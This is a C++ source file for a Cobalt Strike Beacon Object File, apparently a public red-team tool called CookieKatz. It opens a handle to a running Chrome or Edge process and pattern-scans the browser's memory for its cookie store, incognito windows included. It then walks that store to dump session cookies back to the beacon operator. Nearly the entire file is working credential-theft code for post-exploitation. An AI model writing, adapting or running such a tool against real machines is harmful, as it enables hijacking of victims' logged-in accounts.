#include <Windows.h>
#include "base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

#include "ChromeKatz/Process.cpp"
#include "ChromeKatz/Memory.cpp"

extern "C" {
#include "beacon.h"
    DFR(MSVCRT, _stricmp);
#define _stricmp MSVCRT$_stricmp

    //This is important!
    void banner() {
        formatp buffer;
        BeaconFormatAlloc(&buffer, 512);
        BeaconFormatPrintf(&buffer, " _____             _    _      _   __      _       \n");
        BeaconFormatPrintf(&buffer, "/  __ \\           | |  (_)    | | / /     | |      \n");
        BeaconFormatPrintf(&buffer, "| /  \\/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____\n");
        BeaconFormatPrintf(&buffer, "| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
        BeaconFormatPrintf(&buffer, "| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
        BeaconFormatPrintf(&buffer, " \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
        BeaconFormatPrintf(&buffer, "By Meckazin                      github.com/Meckazin \n");
        BeaconPrintf(CALLBACK_OUTPUT, "%s\n", BeaconFormatToString(&buffer, NULL));
        BeaconFormatFree(&buffer);
    };

    void ConvertToByteArray(uintptr_t value, BYTE* byteArray, size_t size) {
        for (size_t i = 0; i < size; ++i) {
            byteArray[i] = static_cast<BYTE>(value & 0xFF);
            value >>= 8;
        }
    }

    //Example inputs:
    //  edge:   0a000000060000002f6564676500
    //  chrome: 0c000000080000002f6368726f6d6500
    //  edge and PID: 0e000000060000002f6564676500f41e0000
    // Remember, first flag then PID!
    /* Beacon > addString / edge
       Beacon > addint 7924
       Beacon > generate
       0e000000060000002f6564676500f41e0000
    */
    void go(char* args, int len) {
        banner();
        BeaconPrintf(CALLBACK_OUTPUT, "Kittens love cookies too! >:3\n\n");

        DWORD chromePid = 0;
        LPCSTR targetConfig = NULL;
        datap parser;
        BeaconDataParse(&parser, args, len);
        if (parser.original == 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "Missing mandatory argument /chrome or /edge!\n");
            return;
        }
        targetConfig = BeaconDataExtract(&parser, NULL);
        chromePid = (DWORD)BeaconDataInt(&parser);

        LPCWSTR processName;
        LPCWSTR dllName;
        const size_t szPattern = 144; //This for allocation
        BYTE pattern[szPattern];
        size_t szActualPattern = 0; //This is for pattern matching
        
        //If chrome
        if (_stricmp(targetConfig, "/chrome") == 0) 
        {
            BeaconPrintf(CALLBACK_OUTPUT, "Targeting Chrome\n");
            processName = L"chrome.exe";
            dllName = L"chrome.dll";
            szActualPattern = 48;
            BYTE chromePattern[] = {
                0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89,
                0xCE, 0xE8, 0x00, 0xD6, 0xFF, 0xFF, 0x85, 0xFF, 0x74, 0x08,
                0x48, 0x89, 0xF1, 0xE8, 0x34, 0x3F, 0x69, 0xFD, 0x48, 0x89,
                0xF0, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC,
                0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC
            };
            for (size_t i = 0; i < szActualPattern; ++i) //Oh god the sphaghetti is everywhere!
                pattern[i] = chromePattern[i];

        }  //If edge
        else if (_stricmp(targetConfig, "/edge") == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "Targeting Edge\n");
            processName = L"msedge.exe";
            dllName = L"msedge.dll";
            szActualPattern = 144;
            BYTE edgePattern[] = {
                0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89,
                0xCE, 0xE8, 0xAA, 0xAA, 0xFF, 0xFF, 0x85, 0xFF, 0x74, 0x08,
                0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89,
                0xF0, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC,
                0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x41, 0x56,
                0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x19,
                0x4C, 0x8B, 0x33, 0x4D, 0x85, 0xF6, 0x74, 0x09, 0x48, 0x89,
                0xCE, 0x48, 0x8B, 0x7B, 0x08, 0xEB, 0x16, 0x48, 0x83, 0xC4,
                0x28, 0xAA, 0xAA, 0xAA, 0x41, 0x5E, 0xC3, 0x48, 0x83, 0xC7,
                0xF8, 0x48, 0x89, 0xF9, 0xE8, 0x1D, 0x00, 0x00, 0xAA, 0xAA,
                0xAA, 0xF7, 0x75, 0xEF, 0x4C, 0x89, 0x73, 0x08, 0x48, 0x8B,
                0x06, 0x48, 0x8B, 0x08, 0x48, 0x83, 0xC4, 0x28, 0x5B, 0x5F,
                0x5E, 0x41, 0x5E, 0xE9, 0xAA, 0xAA, 0xAA, 0xAA, 0x56, 0x48,
                0x83, 0xEC, 0x20, 0x48, 0x85, 0xC9, 0x74, 0x2A, 0x48, 0x8B,
                0x31, 0x48, 0xC7, 0x01
            };
            for (size_t i = 0; i < szActualPattern; ++i) //Oh god the sphaghetti is everywhere!
                pattern[i] = edgePattern[i];
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "No target type specified! Use /edge or /chrome to specify target!\n");
            return;
        }

        HANDLE hChrome;
        if (chromePid != 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "Using the supplied PID: %d\n", chromePid);
            if (!GetChromeHandle(chromePid, &hChrome))
            {
                BeaconPrintf(CALLBACK_ERROR, "Failed to get handle\n");
                return;
            }
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "No PID specified, searching for browser process\n");
            if (!FindCorrectProcessPID(processName, &chromePid, &hChrome)) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to find suitable browser process\n");
                return;
            }
            BeaconPrintf(CALLBACK_OUTPUT, "Targeting PID: %d\n", chromePid);
        }

        uintptr_t baseAddress = 0;
        DWORD moduleSize = 0;
        if (!GetRemoteModuleBaseAddress(hChrome, dllName, baseAddress, &moduleSize))
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to find %ls base address!\n", dllName);
            CloseHandle(hChrome);
            return;
        }
        
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Found the %ls base address on 0x%p\n", dllName,(void*)baseAddress);
#endif
        uintptr_t resultAddress = 0;
        if (!FindDllPattern(hChrome, pattern, szActualPattern, baseAddress, moduleSize, resultAddress)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to find the first pattern\n");
            CloseHandle(hChrome);
            return;
        }

#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Found first pattern on 0x%p\n", (void*)resultAddress);
#endif
        BYTE secondPattern[sizeof(uintptr_t)];
        ConvertToByteArray(resultAddress, secondPattern, sizeof(uintptr_t));

        if (!FindDllPattern(hChrome, secondPattern, sizeof(uintptr_t), baseAddress, moduleSize, resultAddress)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to find the first target pattern!\n");
            CloseHandle(hChrome);
            return;
        }
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Found second pattern on 0x%p\n", (void*)resultAddress);
#endif
        BYTE thirdPattern[sizeof(uintptr_t)];
        ConvertToByteArray(resultAddress, thirdPattern, sizeof(uintptr_t));

        uintptr_t* CookieMonsterInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 100); //There is no person with computer RAM enough to run more than 100 chrome instances :D
        size_t szCookieMonster = 0;
        if (CookieMonsterInstances == NULL || !FindPattern(hChrome, thirdPattern, sizeof(uintptr_t), CookieMonsterInstances, szCookieMonster)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to find the third pattern!\n");
            CloseHandle(hChrome);
            free(CookieMonsterInstances);
            return;
    }
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Found %zu instances of CookieMonster!\n", szCookieMonster);

        for (size_t i = 0; i < szCookieMonster; i++)
            BeaconPrintf(CALLBACK_OUTPUT, "Found CookieMonster on 0x%p\n", (void*)CookieMonsterInstances[i]);
#endif
        //I don't know that the first instance of the CookieMonster is supposed to be, but the CookieMap for it seems to always be empty
        //Each incognito window will have their own instance of the CookieMonster, and that is why we need to find and loop them all
        for (size_t i = 0; i < szCookieMonster; i++)
        {
            if (CookieMonsterInstances == NULL || CookieMonsterInstances[i] == NULL)
                break;

            uintptr_t CookieMapOffset = 0x28; //This offset is fixed since the data just is there like it is
            CookieMapOffset += CookieMonsterInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
#ifdef _DEBUG
            BeaconPrintf(CALLBACK_OUTPUT, "CookieMap should be in address 0x%p\n", (void*)CookieMapOffset);
#endif
            WalkCookieMap(hChrome, CookieMapOffset);
        }

        CloseHandle(hChrome);
        free(CookieMonsterInstances);

        BeaconPrintf(CALLBACK_OUTPUT, "Done\n");
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif